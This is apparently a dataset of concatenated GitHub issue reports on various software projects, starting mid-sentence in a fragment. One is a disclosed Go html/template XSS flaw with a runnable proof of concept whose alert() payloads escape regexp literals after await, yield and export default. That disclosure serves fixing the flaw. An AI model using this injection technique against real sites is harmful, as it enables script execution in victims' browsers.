(in two places). No fix commit was found in the audited tree. --- ## Steps To Reproduce **Pre-conditions:** An attacker can open a PR modifying `README.md` in avelino/awesome-go; the PR is auto-merged once quality checks pass and the site is redeployed. issue_title: TypeSafe blocks: opt-in endpoint setting for self-hosted platforms
issue_description:
### Duplicates

- [x] I have searched the existing issues

### Summary 💡

The TypeSafe Jev blocks always call `api.typesafe.ai`, and `test_overload_is_not_retried_and_environment_cannot_redirect_credentials` makes sure `TYPESAFE_BASE_URL` can't change that. That makes sense for the hosted platform: a stray env var shouldn't be able to send users' keys somewhere else.

For self-hosted installs, an explicit operator setting would help instead. For example, `typesafe_api_base_url` in the backend `Config`, defaulting to `DEFAULT_BASE_URL` and passed to `AsyncTypeSafeClient` in `call_jev`. It wouldn't read the SDK's env var, so that test keeps passing, and nothing changes unless an operator sets it.

### Examples 🌈

Other projects already let operators set this: deer-flow's TypeSafe connection takes a validated `base_url` (`deerflow/typesafe/connection.py`), and LiteLLM's TypeSafe guardrail reads `TYPESAFE_API_BASE`. With the setting, a self-hosted Jev-compatible server could back the blocks without code changes, for example WaterSheep (open source, which I maintain).

### Motivation 🔦

Running the blocks against a local or private server when the data shouldn't leave the network, testing graphs without a TypeSafe key, or going through a company proxy. Happy to send a PR if this direction is OK with you.

issue_title: SubagentStart always sends the full SKILL.md — reuse the shipped condensed fallback for subagent workers
issue_description:
## Request

Have `SubagentStart` send the plugin's own condensed instruction set (`getFallbackInstructions`) instead of the full mode-filtered `SKILL.md` (`getPonytailInstructions`'s primary path), for whichever subagent types end up receiving the injection at all.

## Why

`hooks/ponytail-subagent.js:25` calls `getPonytailInstructions(mode)` unconditionally. That function (`hooks/ponytail-instructions.js:86-90`) reads the full `skills/ponytail/SKILL.md`, mode-filters it, and returns it — **5,229 characters (~1,300 tokens) for the default `full` mode**, verified against current `main` (14a0d79). It only drops to the shorter `getFallbackInstructions` (`hooks/ponytail-instructions.js:43-76`, 2,680 characters / ~670 tokens) when the file read throws — an install error, never a deliberate choice.

That fallback already carries the operative rails — the ladder, the rules, the output format, the "when not to be lazy" boundaries — just without the intensity table and the worked examples, which mainly help a human/persistent-session reader compare lite vs. full vs. ultra. A subagent spawned via the Agent tool gets one task and no memory of the alternatives; it needs the rails, not the comparison. (#592 already keeps canonical vs. fallback content in sync, so this isn't proposing a stale text.)

Measured impact: a heavy Task/Agent-tool session (Claude Code, many subagents) commonly spawns 37–240 subagents; at the current per-spawn size that's roughly 48k–312k tokens of repeated, identical text, and a single 50-spawn swarm alone pays ~65k tokens. Switching matched subagents to the condensed set is close to a 49% cut on that — same rules, about half the tokens. (Reproduction: count `SubagentStart` fires × the injected payload length in any session with many Task/Agent spawns.)

This is separate from #506/#507/#522 (already shipped): `PONYTAIL_SUBAGENT_MATCHER` controls *which* agent types get the injection at all. This is about *how much text* the ones that do get it receive — complementary, not overlapping. See also #502.

## Proposed options (any one solves it)

1. Make `getFallbackInstructions(mode)` the default `SubagentStart` payload — `hooks/ponytail-subagent.js:25` calls the already-exported `getFallbackInstructions(mode)` instead of `getPonytailInstructions(mode)`. One line.
2. Make it configurable, e.g. `PONYTAIL_SUBAGENT_INSTRUCTIONS=full|condensed`, for anyone who wants the full text in matched subagents.
3. Combine with the existing matcher: matched agent types get the condensed set, unmatched get nothing — same opt-in shape as #506.

## Context

Filed from a heavy Task/Agent-tool workflow where this showed up in a per-call overhead check — same shape of report as #506. Happy to send a PR for option 1 if that's the preferred direction.

issue_title: OllamaProvider never sends tools, so tool calling never works with Ollama
issue_description:
## Problem

`OllamaProvider.generate()` never sends `LLMInput.tools` to Ollama. The request body carries `model`, `messages`, `stream` and `options`, but no `tools`. The model is never told the tools exist, so it can't call them, and a `ReActAgent` backed by Ollama never runs a tool. The response parsing for `message.tool_calls` is already in place; it just never gets anything to parse.

The OpenAI, Astraflow, Atlas and Claude providers all forward tools (`test_provider_tools.py` covers them), so Ollama is the only one missing it.

## Reproduction

Ollama 0.35.0, `qwen2.5:0.5b` (tool-capable on Ollama), ECC `main` at c70874f. A `ReActAgent` with one `get_weather` tool, asked *"What's the weather in Hefei right now? Use the get_weather tool."* I wrapped `urllib.request.urlopen` to check whether the request body contains `tools`:

```text
REQUESTS 1 TOOLS_SENT [False]
TOOL_CALLS []
CONTENT "I'm sorry, but I can't assist with that. ..."
```

With `tools` forwarded, the same run makes two requests, calls the tool, and answers from its result:

```text
REQUESTS 2 TOOLS_SENT [True, True]
TOOL_CALLS ['Hefei']
CONTENT 'The weather in Hefei right now is sunny with a temperature of 23 degrees Celsius.'
```

## Proposed fix

When `input.tools` is non-empty, add `payload["tools"] = [tool.to_openai_tool() for tool in input.tools]`. Ollama's `/api/chat` accepts the OpenAI function-tool format. I have a PR ready.

issue_title: html/template: XSS via missing ES2015+ keywords in regexpPrecederKeywords
issue_description:
This is an abridged version of the original report:

````
Summary
-------
The `regexpPrecederKeywords` map in html/template/js.go determines which
JavaScript keywords can precede a regular expression literal. This map was
written based on a draft JavaScript 2.0 lexical grammar from 2000 (cited
at js.go:32) and has never been updated for ES2015+ keywords.

The keywords `await` (ES2017), `yield` (ES2015), and `default` (in
`export default` context, ES2015) are missing from the map. When these
keywords appear before a `/` in template text, `nextJSCtx` returns
`jsCtxDivOp` instead of `jsCtxRegexp`. This causes the template engine to
apply `jsValEscaper` (JSON encoding) instead of `jsRegexpEscaper`. Since
Go's json.Marshal does not escape `/`, an attacker can inject `/` to
break out of the intended regexp literal and execute arbitrary JavaScript.

Affected code (file:line)
-------------------------
Repository: golang/go
Package: html/template

- src/html/template/js.go:111-126     regexpPrecederKeywords map —
  missing await, yield, default
- src/html/template/js.go:92-101      nextJSCtx default case — looks up
  keywords in the incomplete map
- src/html/template/escape.go:240-249  stateJS selects jsValEscaper (wrong)
  instead of jsRegexpEscaper (correct)

Versions: all Go releases including master at e744d9ebb6b.

Root cause
----------
In nextJSCtx (js.go:92-106):

    default:
        j := n
        for j > 0 && isJSIdentPart(rune(s[j-1])) {
            j--
        }
        if regexpPrecederKeywords[string(s[j:])] {
            return jsCtxRegexp
        }
    // ...
    return jsCtxDivOp

For "await", "yield", and "default": the identifier is extracted correctly,
but the lookup in regexpPrecederKeywords fails because these keywords are
not in the map. The function returns jsCtxDivOp instead of jsCtxRegexp.

The map currently lists only pre-ES2015 keywords:

    var regexpPrecederKeywords = map[string]bool{
        "break", "case", "continue", "delete", "do", "else",
        "finally", "in", "instanceof", "return", "throw", "try",
        "typeof", "void",
    }

Compare with keywords that ARE in the map: `return /{{.}}/g` and
`typeof /{{.}}/g` correctly apply jsRegexpEscaper (verified in PoC).

Data flow
---------
1. Template: `<script>async function f(){ return await /{{.}}/g }</script>`
2. tJS calls nextJSCtx("...return await ") before the /
3. nextJSCtx trims whitespace -> "await" -> not in regexpPrecederKeywords
4. Returns jsCtxDivOp (should be jsCtxRegexp)
5. / after await -> treated as division -> stays in stateJS
6. At {{.}} -> stateJS -> jsValEscaper applied (should be jsRegexpEscaper)
7. Attacker input: /;alert(document.domain)//
8. jsValEscaper JSON-encodes: "/;alert(document.domain)//" (/ NOT escaped)
9. Output: <script>async function f(){ return await
/"/;alert(document.domain)//"/g }</script>
10. Browser: regexp /"/  then alert(document.domain) (XSS)

Impact
------
XSS. Same mechanism as my earlier report (< and - in tJS) but different
root cause. An attacker who controls data rendered by html/template in a
<script> element achieves arbitrary JavaScript execution when the template
places the action inside a regexp literal following await, yield, or
export default.

Template patterns affected:
  <script>async function f(){ await /{{.Pattern}}/g.test(x); }</script>
  <script>function* g(){ yield /{{.Filter}}/g; }</script>
  <script type="module">export default /{{.Config}}/g</script>

Reproduction
------------
Tested on Go master at e744d9ebb6b (includes CVE-2026-56858 fix) built
from source on Windows 11.

Save as main.go (go.mod: module poc, go 1.24) and run: go run main.go

    //go:build ignore

    package main

    import (
        "bytes"
        "fmt"
        "html/template"
        "os"
        "strings"
    )

    func main() {
        type testCase struct {
            name     string
            tmpl     string
            input    string
            wantSafe bool
        }

        tests := []testCase{
            {
                name:  "await (XSS)",
                tmpl:  `<script>async function f(){return await
/{{.}}/g}</script>`,
                input: `/;alert('xss-await')//`,
            },
            {
                name:  "yield (XSS)",
                tmpl:  `<script>function* g(){yield /{{.}}/g}</script>`,
                input: `/;alert('xss-yield')//`,
            },
            {
                name:  "export default (XSS)",
                tmpl:  `<script type="module">export default
/{{.}}/g</script>`,
                input: `/;alert('xss-export')//`,
            },
            {
                name:     "return (SAFE — in keyword list)",
                tmpl:     `<script>function f(){return /{{.}}/g}</script>`,
                input:    `/;alert('xss-return')//`,
                wantSafe: true,
            },
            {
                name:     "typeof (SAFE — in keyword list)",
                tmpl:     `<script>typeof /{{.}}/g</script>`,
                input:    `/;alert('xss-typeof')//`,
                wantSafe: true,
            },
        }

        for _, tc := range tests {
            tmpl, _ := template.New("t").Parse(tc.tmpl)
            var buf bytes.Buffer
            tmpl.Execute(&buf, tc.input)
            output := buf.String()
            hasAlert := strings.Contains(output, "alert(")

            fmt.Printf("=== %s ===\n", [tc.name](http://tc.name/))
            fmt.Printf("  Template: %s\n", tc.tmpl)
            fmt.Printf("  Input:    %s\n", tc.input)
            fmt.Printf("  Output:   %s\n", output)
            if tc.wantSafe {
                if hasAlert {
                    fmt.Println("  UNEXPECTED XSS")
                } else {
                    fmt.Println("  SAFE (correctly escaped)")
                }
            } else {
                if hasAlert {
                    fmt.Println("  *** XSS — alert() in output ***")
                } else {
                    fmt.Println("  SAFE")
                }
            }
            fmt.Println()
        }
        os.Exit(0)
    }

Output:

    === await (XSS) ===
      Template: <script>async function f(){return await /{{.}}/g}</script>
      Input:    /;alert('xss-await')//
      Output:   <script>async function f(){return await
/"/;alert('xss-await')//"/g}</script>
      *** XSS — alert() in output ***

    === yield (XSS) ===
      Template: <script>function* g(){yield /{{.}}/g}</script>
      Input:    /;alert('xss-yield')//
      Output:   <script>function* g(){yield
/"/;alert('xss-yield')//"/g}</script>
      *** XSS — alert() in output ***

    === export default (XSS) ===
      Template: <script type="module">export default /{{.}}/g</script>
      Input:    /;alert('xss-export')//
      Output:   <script type="module">export default
/"/;alert('xss-export')//"/g}</script>
      *** XSS — alert() in output ***

    === return (SAFE — in keyword list) ===
      Output:   <script>function f(){return
/\/;alert\('xss\-return'\)\/\//g}</script>
      SAFE (correctly escaped)

    === typeof (SAFE — in keyword list) ===
      Output:   <script>typeof /\/;alert\('xss\-typeof'\)\/\//g}</script>
      SAFE (correctly escaped)

The await, yield, and export default cases all produce XSS. The return
and typeof control cases (which ARE in the keyword list) are correctly
escaped.
````

---

This is CVE-2026-97030, originally tracked in http://b/545173274.

issue_title: Stuttering with MSAA render pass in Chrome Android
issue_description:
### Description

I think it was after the Android 15 or 16 update I started noticing severe stuttering when using the EffectComposer in Chrome for Android to do a post processing gamma correction. The phone is a Pixel 9 and the screen is configured to run at 120hz. Comparing with and without a gamma correction pass, it is smooth without and very stutter-y with it.

I found a rust library called [wgpu](https://wgpu.rs/) that has a WebGL2 backend (via WASM build) that implements the post processing gamma correction out of the box, but it runs smooth as butter for some reason? I would like to see this performance difference resolved.

### Reproduction steps

1. Create a full screen renderer at your phone's physical resolution (window.innerWidth * devicePixelRatio, window.innerHeight * devicePixelRatio).
2. Create any scene you like, such as a plane with a 2048x2048 texture on it.
3. Create an [EffectComposer](https://threejs.org/docs/?q=effectcompo#EffectComposer); add your scene as a [RenderPass](https://threejs.org/docs/?q=renderpass#RenderPass), then add a 2nd pass with [GammaCorrectionShader](https://threejs.org/docs/?q=GammaCorrectionShader#module-GammaCorrectionShader.GammaCorrectionShader).
4. Set up camera controls so you can easily zoom in and out with your fingers on a mobile device.
5. Observe stuttering in Chrome (Android).

Compare to the performance of a similar program using the [wgpu](https://wgpu.rs/) library. The difference being, you don't need to create anything like an EffectComposer because the library automatically performs the gamma correction at the end.

### Code

Relevant wgpu library code:
https://github.com/gfx-rs/wgpu/blob/d183b267d2818d760d85350d3c8cf761cdf1c746/wgpu-hal/src/gles/web.rs#L288

It uses a similar technique, full screen shader to copy a FBO texture to the screen to perform gamma correction.

```js

const scene = new Scene();

const composer = new EffectComposer();
composer.addPass(new RenderPass(scene, camera));

composer.render();
```

issue_title: AARCH64: scalar FMIN/FMAX/FMAXNM mis-lifted when Rd == Rm
issue_description:
**Describe the bug**

The AArch64 SLEIGH semantics for the scalar `FMIN`/`FMAX`/`FMAXNM` instructions write the
destination register before reading the second source operand. When an encoding names the same
register for both `Rd` and `Rm`, the first assignment destroys the operand the subsequent
comparison reads, and the instruction is silently mis-lifted.

`Ghidra/Processors/AARCH64/data/languages/AARCH64neon.sinc`, 9 constructors — 3 operations x 3
widths. The `FMIN` 32-bit one reads:

```
Rd_FPR32 = Rn_FPR32;
zext_zs(Zd);
local tmp1:1 = Rn_FPR32 f<= Rm_FPR32;
if (tmp1) goto inst_next;
Rd_FPR32 = Rm_FPR32;
zext_zs(Zd);
```

For `fmin s0, s6, s0` (`Rd == Rm == s0`) the first statement overwrites `s0` with `s6`, so the
comparison evaluates `s6 f<= s6`, which folds to constant true. The branch becomes unconditional,
the second half of the instruction is dropped, and the bound is gone from the p-code entirely:

```
0055fe08  fmin s0,s6,s0
  (register,0x5000,4) COPY (register,0x50c0,4)                                   ; s0 = s6  <-- clobbers Rm
  (unique,0x179c00,1) FLOAT_LESSEQUAL (register,0x50c0,4), (register,0x5000,4)   ; s6 <= s6
  ---  CBRANCH (ram,0x55fe0c,8), (unique,0x179c00,1)
  (register,0x5000,4) COPY (register,0x5000,4)                                   ; s0 = s0
```

The decompiler then reports `WARNING: Removing unreachable block` at the instruction's own address.

**The `FMAX` form is silent, and therefore worse.** There the comparison is `f>`, so a self-clobber
folds to constant *false*: the branch is simply never taken, no block becomes unreachable, and **no
warning is emitted at all**. The instruction is mis-lifted with nothing to indicate it.

Only `Rd == Rm` is affected. Three distinct registers lift correctly, and so does `Rd == Rn`,
because `Rd = Rn` is idempotent. `FMINNM` is unaffected — it uses an opaque pcodeop rather than this
inline pattern.

**To Reproduce**

1. Write these 8 bytes to a file — `fmin s0, s6, s0` followed by `fmax s0, s6, s0`:
   `c0 58 20 1e c0 48 20 1e`
2. Import it into Ghidra with format *Raw Binary* and language `AARCH64:LE:64:v8A`.
3. Disassemble at offset `0`.
4. Read the raw p-code of each instruction (*Edit > Tool Options > Listing Fields > PCode Field*,
   or the decompiler's *Debug Function Decompilation*).
5. Both instructions lift as `s0 = s6`, with the comparison and the second assignment folded away.
   `fmin` additionally raises `WARNING: Removing unreachable block`; `fmax` raises nothing.

**Expected behavior**

`fmin s0, s6, s0` should compute `s0 = min(s6, s0)`, preserving the original value of `s0` as an
operand of the comparison.

**Environment (please complete the following information):**
 - OS: macOS 26.6.2
 - Java Version: OpenJDK 21.0.12.1
 - Ghidra Version: 12.1.3
 - Ghidra Origin: third party distro (Homebrew)

**Additional context**

The p-code above was captured on a stock, unpatched install. The same nine constructors are
unchanged in `master` as of this report.

Found in compiler-generated ARM64 code, where the instruction arises naturally from a clamp idiom:
the compiler emitted `fmov s0, #1.0` followed by `fmin s0, s6, s0` for an upper bound. The
decompiled body lost the upper clamp entirely, so the function silently returns a wrong value for
inputs above the bound rather than failing visibly.

The template also disagrees with the ARM specification on NaN and signed zero — a comparison against
NaN is false, and `+0 == -0` makes the two indistinguishable by comparison at all. That is
pre-existing and orthogonal to the self-clobber; this report does not attempt it, and it may deserve
a separate issue.

**Related (not duplicates)** — the same general defect class, "the destination is written before a
source that aliases it is read", has been reported for other processors: #6557 (x86 `XADD`) and
#4282 (x86 `POP` with stack-pointer operands). I could not find an existing report for the AArch64
scalar min/max case.

**Suggested fix**

Read both operands into locals before writing `Rd`, in all 9 constructors:

```
local lhs32:4 = Rn_FPR32;
local rhs32:4 = Rm_FPR32;
Rd_FPR32 = lhs32;
zext_zs(Zd);
local tmp1:1 = lhs32 f<= rhs32;
if (tmp1) goto inst_next;
Rd_FPR32 = rhs32;
zext_zs(Zd);
```

I have applied exactly this locally (all 9 constructors, recompiled the grammar with
`support/sleigh -a`) and confirmed the clamp is recovered and the warning disappears, with no other
function in the same binary changing output. Happy to open a PR if that is useful.

issue_title: Consider updating diagnostic channel event names for bundled modules
issue_description:
https://openjs-foundation.slack.com/archives/C01QF9Q31QD/p1766166962883319

I'd like to propose that when Node.js bundles an external module that generates `diagnostic_channel` events, that those event names are differentiated from the upstream names. Consider `undici`, it generates events such as `undici:request:pending-requests` (https://undici.nodejs.org/#/docs/api/DiagnosticsChannel?id=undicirequestpending-requests). These events are emitted as-is from the Node.js bundled version of Undici, thus making it impossible to determine if the event was generated from the standalone module or the bundled module.

In day-to-day usage, this is not technically a problem. I am sure we can think of other cases where it might be an issue, but my current problem is that I need to retrieve the module version for the module that generated the event. I cannot currently rely on `registerHooks` to solve this because v20 does not support it.

Regardless, I just think it would be better to differentiate between upstream and bundled in event emissions for clarity.

Bug: React.lazy waits ~300ms before rendering even when the preloaded promise has resolved
issue_description:
React version: 19.2.6

## Steps To Reproduce

1. Open the repro repository: https://github.com/andyzhan7/react-suspense-fallback-throttle

2. Open either reproduction file:
   - `precreated-routes.html`
   - `render-created-loader.html`

3. Wait until the `Student` and `Teacher` loaders have been preloaded.

4. Click `Student` or `Teacher`.

Link to code example: https://github.com/andyzhan7/react-suspense-fallback-throttle

## The current behavior

A route component loaded through `React.lazy` can be delayed by about 300ms on its first render, even when the loader promise has already resolved before that render.

The repro uses this minimal lazy route wrapper:

```js
function LazyLoader(loader) {
  const Comp = React.lazy(loader)
  return props => React.createElement(
    React.Suspense,
    null,
    React.createElement(Comp, props || null),
  )
}
```

The route loaders are preloaded on page load. They simulate network/chunk loading with a short `sleep(...)`, so by the time the user clicks `Student` or `Teacher`, the loader promise has already resolved.

However, the first render of the lazy route still commits about 300ms later:

```text
0.5ms loader called: Student
302.1ms content committed: Student
```

Because the Suspense boundary has no fallback, this appears as a blank content area for about 300ms.

## The expected behavior

If a `React.lazy` loader promise has already resolved, React should render the loaded component as soon as that resolved promise is observed, instead of waiting for the 300ms fallback throttle window.

In this case, after clicking `Student` or `Teacher`, the route content should commit immediately or near-immediately because the lazy loader promise was already resolved by preload.

issue_title: Adding Circular Linked List In Data Structure.
issue_description:
**Issue Description**:

**Objective**:
Add Circular Linked List to our list of recognized data structures.

**Proposal**:
Circular Linked List should be added as a core data structure due to its unique functionalities and widespread applicability.

**Reasoning**:
1. Circular Iteration: Enables seamless circular iteration, valuable for cyclic data processing needs.
2. Efficient Queue Implementation: Forms the foundation for circular queues, allowing for efficient enqueue and dequeue operations without element shifting.
3. Memory Management: Simplifies cyclic reference handling in memory management tasks like garbage collection.

Circular Linked Lists extend the capabilities of linear data structures, making them a valuable addition to our toolkit.

issue_title: Follow-ups for PR #18254 (PPTX one chunk per slide): cleanup + parity
issue_description:
## Context

PR #18254 (\`fix(go): parse PPTX one chunk per slide\`) fixes a real bug: in Go parse mode a multi-slide PPTX deck collapsed into a single chunk because \`PPTXParser.ParseWithResult\` split \`PlainText()\` on \`\f\`, which office_oxide never emits. The fix derives per-slide text from the structured IR (\`ToIRJSON\`, one section per slide) and was rewritten to reuse \`docx_ir.go\` (\`docxElementText\`), so list / nested-list / table / text-box / line-break text is no longer dropped.

The fix is correct and should merge. The items below are non-blocking follow-ups raised during review. **Contributors are welcome to open these as separate, independent PRs** — they do not all need to land together, and splitting them makes each easier to review.

## Follow-up 1 — Simplify \`buildPPTXJSONSections\` (remove the split/rejoin round-trip)

File: \`internal/parser/parser/pptx_ir.go\`

Current code flattens each slide element with \`docxElementText(el)\` and then **splits the result on \`\n\`, drops blank lines, and rejoins with \`\n\`**. This is an unnecessary round-trip: the only observable effect is that *consecutive* hard line breaks inside one paragraph collapse to a single newline.

Suggested change: append each element's text once (trimmed, and only if non-empty) as a single value, and join elements with \`\n\` — no per-element split on newlines. This removes the special "consecutive line breaks collapse to one newline" handling and the matching test assertion, making the code shorter and the intent clearer. (Whether to preserve multiple blank lines is a judgement call; the simplification is the point.)

See CodeRabbit's 2026-08-20 note on \`pptx_ir.go\` (lines ~46-50).

## Follow-up 2 — Remove Python-compat wording from comments

File: \`internal/parser/parser/pptx_parser.go\`

The doc comment on \`ParseWithResult\` still reads like a compatibility note:

> \`Mirrors the python parser.py:slides branch which forces output_format="json" for the slide family.\`

Per the repo's \`AGENTS.md\` ("do not add new compatibility wording in comments/docs"), reword to a factual description, e.g. "forces \`output_format=json\` and emits one JSON item per slide section." Comment-only; no behavior change.

## Follow-up 3 — \`doc_type_kwd: "image"\` alignment (pre-existing tech-debt)

\`ParseWithResult\` hardcodes \`doc_type_kwd: "text"\`. In the Python slide path, slides are rendered/OCR'd and carry \`doc_type_kwd: "image"\`. This discrepancy is **pre-existing** (the old \`pptx_parser.go\` also hardcoded \`"text"\`) and is out of scope for #18254. Track it separately: either emit \`doc_type_kwd: "image"\` with the base64 slide image for image-only slides, or skip empty items, so image-only decks don't produce empty \`text\` chunks.

## Follow-up 4 — Go↔Python text-format parity (bullet / table)

Even after #18254, the *text content* of a slide differs between the Go and Python parsers:

- Python \`RAGFlowPptParser.__get_bulleted_text\` (\`deepdoc/parser/ppt_parser.py\`) prefixes bullets with \`"  " * level + "."\` and transposes tables to \`header: value\` per row.
- The Go path via \`docxElementText\` emits plain text and flattens tables row-by-row (\`H1\nH2\na\nb\`).

These are pre-existing parity gaps (not introduced by #18254). This is a larger topic than the chunk-count fix and is better handled in its own PR/issue rather than widening #18254.

## Suggested split

- PR A: Follow-up 1 + 2 (small, comment/logic cleanup in \`pptx_ir.go\` / \`pptx_parser.go\`).
- PR B: Follow-up 3 (\`doc_type_kwd\` alignment).
- PR C: Follow-up 4 (text-format parity) — likely needs its own design discussion.

Each can be reviewed and merged independently.

issue_title: Bug: `<ViewTransition>` name-prop change does not trigger view transition without child DOM mutation
issue_description:
A `<ViewTransition>` whose `name` prop changes between renders does **not** trigger the view transition update pipeline unless a child DOM mutation also occurs. Hero morphs via name-prop toggling on mounted components silently produce no animation.

> **Update (2026-06-10):** A fix is now proposed in [facebook/react#36728](https://github.com/facebook/react/pull/36728). The GitHub Pages live preview below has since been rebuilt against a **patched** React build that includes that fix, so it now demonstrates the *corrected* behaviour, not the bug. To see the original broken behaviour, use the CodeSandbox (unpatched canary) or check out a commit before `cf0fe598` in the reproduction repo.

## React version

- `react`: `19.3.0-canary-46103596-20260305`
- `react-dom`: `19.3.0-canary-46103596-20260305`

## Steps to reproduce

1. Mount two `<ViewTransition>` boundaries wrapping a button and a dialog
2. Toggle the `name` prop between them (one gets `"camera-hero"`, the other `undefined`) via `startTransition` + `addTransitionType`
3. No child DOM mutations occur during the transition

**Reproduction repo:** https://github.com/kjanat/react-canary-19.3.0-view-transition-bug  
**Live preview:** https://kjanat.github.io/react-canary-19.3.0-view-transition-bug/ (now serves a **patched** build that includes the fix, so it no longer reproduces the bug, see the update note above)  
**CodeSandbox:** https://codesandbox.io/p/sandbox/yx5sdy (broken version)

Toggle between **Broken** and **Workaround** modes to see the difference. Note: on the patched GitHub Pages preview both modes now animate; use the CodeSandbox above (unpatched canary) to observe the original broken vs. workaround contrast.

Minimal repro component:

```tsx
<ViewTransition
  name={heroOwner === 'button' ? 'camera-hero' : undefined}
  share="camera-hero-morph"
  default="none"
>
  <button>Use live camera</button>
</ViewTransition>

<ViewTransition
  name={heroOwner === 'dialog' ? 'camera-hero' : undefined}
  share="camera-hero-morph"
  default="none"
>
  <dialog ref={dialogRef}>{modalContent}</dialog>
</ViewTransition>
```

The `heroOwner` state toggles between `'button'` and `'dialog'` inside `startTransition` with `addTransitionType('camera-modal')`.

## Expected behavior

Opening the modal morphs smoothly from the trigger button to the dialog (shared `camera-hero` element with CSS view-transition animations).

## Actual behavior

Modal appears instantly -- no hero morph animation. See [root cause §1](#1-name-only-changes-do-not-produce-update) for the code path that leads to a zero-opacity cancellation.

### Workaround

Two changes required simultaneously (visible in workaround mode in the reproduction):

1. **`update` prop** -- unblocks VT processing (otherwise `default='none'` gates it out):
   ```tsx
   update={{ default: 'none', 'camera-modal': 'camera-hero-morph' }}
   ```
2. **Forced child DOM mutation** -- sets the internal `Update` flag on the VT fiber:
   ```tsx
   <button data-hero-owner={heroOwner}>Use live camera</button>
   ```

The `data-hero-owner` attribute serves no purpose other than forcing a child DOM mutation that sets a flag which logically should depend on the name change itself.

## Root cause (source references)

All references below are GitHub permalinks to React commit [`4610359651fa10247159e2050f8ec222cb7faa91`][react-commit], matching `react-dom@19.3.0-canary-46103596-20260305`.

### 1. Name-only changes do not produce `Update`

In [`measureViewTransitionHostInstancesRecursive`][measure-recursive], the `Update` flag gates whether `applyViewTransitionName` fires for the new snapshot:

```js
(parentViewTransition.flags & Update) !== NoFlags
  && applyViewTransitionName(instance, newName, className);
```

In this code path, the `Update` flag is set in the mutation phase ([`ReactFiberCommitWork.js#L2634-L2645`][update-flag-set]) when `viewTransitionMutationContext` is `true`:

```js
viewTransitionMutationContext && (finishedWork.flags |= Update);
```

`viewTransitionMutationContext` becomes `true` when a DOM mutation (attribute change, text change, element insertion/removal) occurs within the VT's child subtree during the mutation commit. The `Update` flag can also be set during measurement if `hasInstanceChanged()` detects a bounding-rect change ([L676-681][has-instance-changed]), but in this scenario (name-only prop change, no layout shift), measurements are identical and this path returns false.

When only the VT's `name` prop changes, with no child mutations and no layout change, the flag stays `NoFlags`. Without `Update`, the instance is not passed to `applyViewTransitionName` but is instead pushed to `viewTransitionCancelableChildren`, which leads to a zero-opacity cancellation path in [`ReactFiberConfigDOM.js#L1616-L1640`][cancel-animation]:

```js
current.animate(
  { opacity: [0, 0], pointerEvents: ['none', 'none'] },
  { duration: 0, fill: 'forwards', pseudoElement: '::view-transition-group(' + oldName + ')' },
);
```

> **Note:** this cancellation path is only reachable when the `update` prop unblocks before-mutation snapshot capture and after-mutation measurement. With `default='none'` and no `update` prop, host instances never receive VT names in the first place, so they never reach `viewTransitionCancelableChildren`. The zero-opacity cancellation manifests specifically in the partial-workaround state (setting `update` without also forcing a DOM mutation).

React already detects the name change in `beginWork` at [`ReactFiberBeginWork.js#L3617-L3622`][name-change-detected]:

```js
if (current !== null && current.memoizedProps.name !== pendingProps.name) {
  workInProgress.flags |= Ref | RefStatic;
}
```

This sets `Ref | RefStatic` for ref lifecycle, but it does not propagate into the commit phase as a VT update signal.

### 2. `default='none'` gates out the update path (compounding)

The `share` prop name suggests it controls shared-element/hero morphs, but in the source it is consulted in the **enter/exit pair** path ([`commitEnterViewTransitions`][commit-enter] and [`commitExitViewTransitions`][commit-exit]) and not in the update path. When both VTs stay mounted and only change their `name` prop, React routes through the **update** path, which calls `getViewTransitionClassName(props.default, props.update)` in two phases:

| Phase           | Source permalink                                                       | Gate                                                                |
| --------------- | ---------------------------------------------------------------------- | ------------------------------------------------------------------- |
| Before-mutation | [`ReactFiberCommitViewTransitions.js#L489-L513`][before-mutation-gate] | Class name `=== 'none'` → skip old-snapshot VT name application     |
| After-mutation  | [`ReactFiberCommitViewTransitions.js#L768-L803`][after-mutation-gate]  | Class name `=== 'none'` → skip measurement and new-snapshot VT name |

The mutation phase ([`ReactFiberCommitWork.js#L2623-L2633`][update-mutation-gate]) also checks the class name to set `inUpdateViewTransition`, but this variable controls Portal context propagation in the traced code path -- the `Update` flag assignment at [L2634-L2645][update-flag-set] is gated by `viewTransitionMutationContext`, not by the class name.\
So `default='none'` blocks the before/after-mutation phases, while the missing DOM mutation independently blocks the `Update` flag.

### 3. Separate observation: `share` not consulted in update path

The `share` prop is only consulted in the enter/exit pair path and not in the update path. This may be by-design (the update path handles DOM mutations, not shared-element pairing), but the documentation is silent on the expected behavior when only `name` changes on a mounted `<ViewTransition>`.

## Suggested fix

The name-change detection in [`beginWork`][name-change-detected] (`current.memoizedProps.name !== pendingProps.name`) could additionally set the `Update` flag or an equivalent signal, so the commit phase treats the VT as updated even without child DOM mutations.

A cleaner alternative is to keep the fix local to the mutation-phase commit handler for `ViewTransitionComponent`, adding a name-change check alongside `viewTransitionMutationContext`:

```js
} else if (
  viewTransitionMutationContext
  || current.memoizedProps.name !== finishedWork.memoizedProps.name
) {
  finishedWork.flags |= Update;
}
```

This would keep the `Update` flag closer to its apparent current usage (set during mutation phase, consumed in measurement) without changing `beginWork` flag behavior.

Additionally, the `share` className may need to be consulted in the update path when a name change is detected, not only in the enter/exit pair path.

## Docs note

The `<ViewTransition>` documentation distinguishes `share` (enter/exit pairing) from `update` (DOM mutations / layout effects), but does not clarify what should happen when only the `name` prop changes across already-mounted `<ViewTransition>` boundaries. It's unclear whether mounted name toggling is expected to produce a transition or is intentionally unsupported.

ponytail-audit: no pass to flag AI-shaped test brittleness (fixture-name branches in prod, snapshot/mock-only assertions, 1:1 method-mirror tests)
issue_description:
ponytail's test stance is minimal and construction-time: "non-trivial logic leaves one runnable check." But `ponytail-audit`, scanning existing code, has no pass to flag AI-generated *test* slop, which is a distinct and common failure mode:

- tests that mirror implementation methods 1:1 (break on any refactor; they assert structure, not behavior)
- snapshot-only or mock-call-only assertions (they pin the AI's own output, not observable behavior)
- worst: fixture-name / id / timestamp branches leaking into *production* code to make a test pass

These pass CI and expose no deletable abstraction, so the ladder skips them, but they're maintainability slop, and the fixture-branch-in-prod case is also a correctness smell (production behavior special-cased for test data).

Distinct from #602, which is about ponytail constraining the agent *while writing* tests; this is the *audit* skill *detecting* brittleness in tests that already exist.

Suggested: one `## Hunt` bullet: fixture-name/id/timestamp branches in production code (encode the real invariant instead); snapshot-only / mock-call-only assertions (prefer observable behavior); tests that mirror methods 1:1 rather than behaviors.

Source: Google Testing Blog, "Test Behaviors, Not Methods."

Happy to open the PR.

issue_title: runtime: allocation profile is stale when collected multiple times before GC happens
issue_description:
### Go version

go version go1.27.1 darwin/arm64

